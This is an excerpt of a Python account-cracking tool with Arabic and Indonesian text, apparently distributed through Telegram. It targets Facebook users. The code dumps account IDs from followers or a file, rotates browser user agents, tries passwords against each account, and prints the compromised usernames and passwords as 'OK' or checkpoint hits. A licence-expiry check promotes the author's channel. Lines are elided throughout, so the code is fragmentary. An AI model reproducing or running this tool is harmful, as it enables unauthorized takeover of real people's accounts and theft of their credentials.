...
g= datetime.datetime(2024,10  , 1, 1, 00 ,0)

if (x.strftime("%x"))>(g.strftime("%x")):
 print('\n\n')
 print("     "+' انتهئ التفعيل انضم للقناه للحصول ع احدث نسخهhttps://t.me/ZZKGZ🖤' )
 print('\n\n')
 print(x)
...
if (x.strftime("%x"))==(g.strftime("%x")):
   ...
   if(x.strftime("%X"))>(g.strftime("%X")):
    print('\n\n')
    print("     "+' انتهت الصلاحيه عليك بمراسلت كرار يفعلك  🖤' )
    print('\n\n')
    print(x)
...
pretty.install()
CON=sol() 
user_agent=['Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:46.0) Gecko/20100101 Firefox/46.0','Mozilla/5.0 (X11; Ubuntu; Linux i686 on x86_64; rv:50.0) Gecko/20100101 Firefox/50.0','Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:45.0) Gecko/20100101 Firefox/45.0','Mozilla/5.0 (Windows NT 6.2; Win64; x64; rv:46.0) Gecko/20100101 Firefox/46.0','Mozilla/5.0 (X11; Linux i686) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.80 Safari/537.36','Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.111 Safari/537.36','Mozilla/5.0 (X11; Ubuntu; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.83 Safari/537.36','Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.105 Safari/537.36','Mozilla/5.0 (X11; Linux i686) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.110 Safari/537.36','Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; Trident/6.0)','Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:47.0) Gecko/20100101 Firefox/47.0','Mozilla/5.0 (X11; Linux i686 on x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.83 Safari/537.36','Mozilla/5.0 (X11; Linux i686 on x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.183 Safari/537.36','Mozilla/5.0 (Windows NT 6.2; Win64; x64; rv:47.0) Gecko/20100101 Firefox/47.0','Mozilla/5.0 (Macintosh; Intel Mac OS X 10.9; rv:47.0) Gecko/20100101 Firefox/47.0','Mozilla/5.0 (Macintosh; Intel Mac OS X 10.10; rv:47.0) Gecko/20100101 Firefox/47.0','Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.125 Safari/537.36','Mozilla/5.0 (Windows NT 5.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.78 Safari/537.36','Mozilla/5.0 (Windows NT 6.2; Win64; x64; rv:49.0) Gecko/20100101 Firefox/49.0','Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)','Mozilla/5.0 (Linux; Android 9; SH-03J) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36 XiaoMi/MiuiBrowser/16.7.27 swan-mibrowser']
...
N = '\x1b[0m'    # WARNA MATI
H = '\x1b[1;92m' # HIJAU
K = '\x1b[1;93m' # KUNINGM = '\x1b[1;91m' # MERAH
O = '\x1b[1;96m' # BIRU MUDA
N = '\x1b[0m'    # WARNA MATI
H = '\x1b[1;92m' # HIJAU
K = '\x1b[1;93m' # KUNING
...
#--------------------------------------------
  ...
  %s{%s03%s} validate
"""%(N,H,N,N,H,N,N,H,N))
        ykh = input(f"{H}[{M}+{H}]{N} كروري الجوزي_> ")
        if ykh in ["", " "]:
            print("[!] jangan kosong");time.sleep(2);self.menu()
        elif ykh in ["1", "01"]:
            self.paswww("api")
...
def menu(my_name,my_id):
	...
	print(Z+'\x1b[38;5;208mTelegram ᯼ @KLK2K3  ')
	print(F+          '𝖐𝖗𝖆𝖗')
	print('[v-19]')
	...
	print('» 2- Fishing from followers : صيد من المتابعين  ')
	print('» 3- Crack File : صيد من ملف  ')		
	print('» 0- login out : تبديل كوكيز   ')
...
def dump_massal():
	try:
		...
		exit()
	try:
		jum = int(input('» Number ID | انصحك تخلي اكثر من2 : '))
	except ValueError:
	...
	try:
		print('')
		print(f'» ID |  انصحك تخلي اكثر من 2 {h}'+str(len(id)))
		setting()
	except requests.exceptions.ConnectionError:
		print(f'{x}')
		print('>> Sinyal Loh Kurang Bagus ')
...
def setting():
	print("\033[2;36m ~~~~~~~~~~~~~~~~~~~~~~~")
	print(f'» 1- Id old | الاولويه فحص حسابات قديمه')
	print('» 2- Id New | الاولويه فحص حسابات جديده')
	print('» 3- Old+new | الاولويه فحص حسابات قـديـمـه + وجـديده ')
	print('')
	hu = input('» Chose : ')
	if hu in ['1','01']:
...
def crack(idf,pwv):
	...
	fff = '%'
	print('\r%s <𝑲𝑹𝑨𝑹> %s/%s » [𝙾𝙺] %s » [𝙲𝙿] %s » %s%s%s'%(bi,loop,len(id2),ok,cp,int(pers),str(fff),x), end=' ');sys.stdout.flush()
		...
		try:
			...
			if "checkpoint" in po.cookies.get_dict().keys():
				if 'ya' in oprek:
					...
					print('\n')
					statuscp = f'''حساب سكيور انتضر لاتفقد الامل كلبي
⋘─────━𓆩مدفوع𓆪‏━─────⋙
❖ - 𝖴𝖲𝖤𝖱𝖭𝖠𝖬 : {idf}\n
❖ - 𝖯𝖠𝖲𝖲𝖤𝖱𝖣 : {pw}\n
⋘─────━𓆩مدفوع𓆪‏━─────⋙
𝑲𝑹𝑨𝑹  -  @KLK2K3					
				...
				if 'no' in taplikasi:
					...
					print('\n')
					statusok = f'''حساب شغال بلعافيه قلبي
⋘─────━𓆩مدفوعه𓆪‏━─────⋙
❖ - 𝖴𝖲𝖤𝖱𝖭𝖠𝖬 : {idf}\n
❖ - 𝖯𝖠𝖲𝖲𝖤𝖱𝖣 : {pw}\n
⋘─────━𓆩مدفوعه𓆪‏━─────⋙
𝑲𝑹𝑨𝑹  -  @KLK2K3					
					...
					infoakun += f'''حساب شغال بلعافيه قلبي
⋘─────━𓆩مدفوع𓆪‏━─────⋙
